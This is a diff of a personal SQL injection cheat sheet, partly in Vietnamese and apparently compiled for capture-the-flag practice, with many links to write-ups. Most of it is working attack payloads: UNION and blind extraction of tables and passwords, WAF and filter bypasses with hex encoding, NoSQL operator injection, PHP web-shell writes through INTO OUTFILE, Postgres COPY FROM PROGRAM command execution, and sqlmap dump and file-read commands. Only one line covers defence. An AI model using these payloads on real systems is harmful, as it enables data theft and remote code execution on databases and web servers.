@@ -1,15 +1,42 @@
+https://whitehat.vn/threads/web5-sql-injection-mot-so-ky-thuat-vuot-qua-co-che-loc.885/
+illegal mix of collation for operation UNION
+https://blog.csdn.net/qq_44657899/article/details/103239145
+show columns from table;
+rename table words to words1
+;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
+mã SQL được mã hóa dưới dạng chuỗi hex
+handler `<tablename>` open as `a`; handler `a` read next;#
+
+https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4  --> escapse ? as string by object input
+https://hackmd.io/@onsra03/SkiBeaed3
+username=admin&password[password]=1
+{
+    "user":"Admin",
+    "pass":
+        {
+            "password":true
+        }
+}
+{'user':'Admin','pass':{'username':false}}
+
 ' order by 3 --
 ' UNION SELECT 'abcdef',NULL,NULL--
 multiple values in a single column  -->  ' UNION SELECT NULL,username||'~'||password FROM users--
 
-check version   Oracle              -->  ' UNION SELECT BANNER, NULL FROM v$version--
+check version   Oracle              -->  ' UNION SELECT BANNER, NULL FROM $version--
                 MySQL and Mincrosoft-->  ' UNION SELECT @@version, NULL#   
                                     -->  ' UNION SELECT version(), NULL#
 ' UNION SELECT table_name, 'a' FROM all_tables--  (oracle)
 --oracle --> https://hackmd.io/@to016/H1nFH60_o#Examining-the-database --> blind SQL
+https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
+
+SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
 
 content non-Oracle -->' UNION SELECT 'abc','def'#                   
-' UNION SELECT table_name, NULL FROM information_schema.tables--
+' UNION SELECT group_concat(table_name), NULL FROM information_schema.tables--
+https://laxiisteam.blogspot.com/2023/08/blog-post.html#comments
+information_schema.INNODB_SYS_TABLES , mysql.innodb_table_stats , information_schema.INNODB_SYS_TABLES
+
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 
@@ -28,8 +55,18 @@ mysql -udb_user -pdb_password
 show databases;
 use myDB;
 
+' OR (WITH cte(c1,c2,c3) AS (SELECT * FROM QuiBuu) SELECT instr(c3,'{test_flag}') FROM cte WHERE c1='1337')  OR id='200000
+#--------------find the command create table
+https://laxiisteam.blogspot.com/2023/09/patriotctf-va-spycio.html
+' union select 1,sql,3,4 from sqlite_master-- -
+admin" union select 1,2,3,sql from sqlite_master where sql not null-- -
+admin" union select id,email,username,password from accounts where email not like "one@gmail.com" and email not like "two@gmail.com"-- -
 #---------------------blind SQL
-INSERT INTO log (uid, agent, cdate) VALUES (xx, ‘2’,if(1=1,sleep(10),’a’))– – ‘, NOW())
+https://hackmd.io/_6-9roHHQY23xUp6RwpqyA
+INSERT INTO log (uid, agent, cdate) VALUES (xx, '2',if(1=1,sleep(10),'a'))– – ', NOW())
+
+https://hackmd.io/@onsra03/rkK7hsrl2#Orbital
+admin\" and IF(SUBSTR(password,{i},1)=\"{j}\",SLEEP(2),SLEEP(0)) -- 
 
 UNION SELECT gRoUp_cOncaT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_name like "%flag%"-- -
 UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
@@ -47,21 +84,68 @@ sheng’ and (Select LENGTH(password) FROM users WHERE username like “%sheng%�
 sheng’ and (Select LENGTH(password) FROM users WHERE username like “%sheng%”) > 1#
 sheng’ and (Select SUBSTRING(password,$1$,1) FROM users WHERE username like “sheng”) like “$a$”#
 
--99 union SELECT GROUP_CONCAT(User, File_priv,@@secure_file_priv) FROM mysql.user --
-100 union select  null,null,"<?php system($_GET['cmd']);?>",null INTO OUTFILE "/var/www/html/revshell.php" --
+''''' UniOn sELecT  (sELecT 0x64617461626173652829)  from muahahaha-- ffsf
+''''' UniOn sELecT  (sELecT table_name from 0x696e666f726d6174696f6e5f736368656d612e7461626c6573 where table_schema=0x78616c6f6d616e)  from users-- ffsf
+''''' UniOn sELecT  (sELecT * 0x696e666f726d6174696f6e5f736368656d612e636f6c756d6e73 where table_name=0x5573657273 and table_schema=0x78616c6f6d616e)  from users-- ffsf
+''''' UniOn sELecT  (sELecT * 0x696e666f726d6174696f6e5f736368656d612e636f6c756d6e73 where table_name=0x70617373776f7264 and table_schema=0x78616c6f6d616e)  from users-- ffsf
+
+https://nguyendt.hashnode.dev/crewctf-2022   sqlite
+---------------------------------------bypass filer
+https://hackmd.io/@taidh/Bk94PZjt9#Challenge-Find-me
+--------------["'", '"', '*', '\\', '/', '#', ';', '-']
+select char(0x4d,0x53,0x47,0x2d) || sql as msg from sqlite_master
+
+--------------space using %0d or /**/
+-------------filter [*, /, ‘, --, #, ;, a-z A-Z 0-9]
+https://www.facebook.com/notes/648595279153522
+select !"";   #same select 1;
+
+https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
+https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/
+-----------bypass filter column name
+select 1 as a,2 as b,3 as c, 4 as d union select * from users limit 2
+
+https://blog.efiens.com/post/doublevkay/ptitctf2020-writeups/
+UNION SELECT null,null,(IF(BINARY SUBSTRING((SELECT table_name FROM information_schema.tables where TABLE_SCHEMA = database() and table_name != 'info'),{pos},1) = BINARY '{char}',BENCHMARK(5000000,ENCODE('MSG','by seconds')),null)) FROM info; -- -
+
+'or substr((select group_concat(b) from (select 1,2 as b union select * from `sqli_blind`)a),{i},1)='{j}' #
 ------------------------------------RCE
-print (("<? system($_GET['cmd']); ?>").encode('utf-8').hex())
+-99 union SELECT GROUP_CONCAT(User, File_priv,@@secure_file_priv) FROM mysql.user --
+100 union select  null,null,"<?php sys-tem($_GET['cmd']);?>",null INTO OUTFILE "/var/www/html/revshell.php" --
+
+https://stackoverflow.com/questions/26194971/hex-encode-in-sql-injection
+print (("<? sys-tem($_G-ET['cm-d']); ?>").enco-de('utf-8').hex())  #xoa - di do antivirus
 --->3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e
 x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -
+
+DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'ls';SELECT * FROM cmd_exec;
 --------------------------------------save value
 SELECT * FROM fa_dating_users WHERE fa_dating_username = 'admin' INTO @var1,@var2,@var3,@var4,@var5,@var6,@var7
 INSERT INTO fa_dating_users VALUES ('username','password','pin',yob,'interest',@var2,'name')
 -----------------------------------defend
 $id = $database->real_escape_string($_GET["id"]);
 
-https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/
-'or substr((select group_concat(b) from (select 1,2 as b union select * from `sqli_blind`)a),{i},1)='{j}' #
+https://gist.github.com/tehseensagar/d82931fa8427b3b8a8825714b5b113c4
+https://hackmd.io/@Dat2Phit/rJgj_mG0i   #binary search
+------------------------------MSSQL
+https://www.4rth4s.xyz/2022/04/pentest-sql-injection-with-mssql.html
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://0xdf.gitlab.io/2022/04/11/htb-tally.html
+mssqlclient.py username:<passwd>@<ip> -debug
+---------------------------mongo regrex
+https://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.md
+{
+  "_id": "_id:3",
+  "challenge_flag": {
+    "$regex": "^INTIGRITI{"
+  }
+}
+#--------------------------------------------------------------sqlmap
+https://viblo.asia/p/efiens-ctf-2019-write-up-tu-sql-injection-toi-rce-va-get-root-oOVlYom4K8W
+sudo sqlmap -r sqli.req --dump
+sqlmap -r ticket_attachment.request --level 5 --risk 3 -p <parameter_inject>
 
----blind SQL 
-https://nguyendt.hashnode.dev/crewctf-2022   sqlite
-https://hackmd.io/@onsra03/BJFnD2-7j
+#read file with sqlmap
+https://0xdf.gitlab.io/2022/10/29/htb-trick.html#preprod-payrolltrickhtb
+sqlmap -r login.req --batch --threads 10 --file-read=/etc/hostname
+cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname 
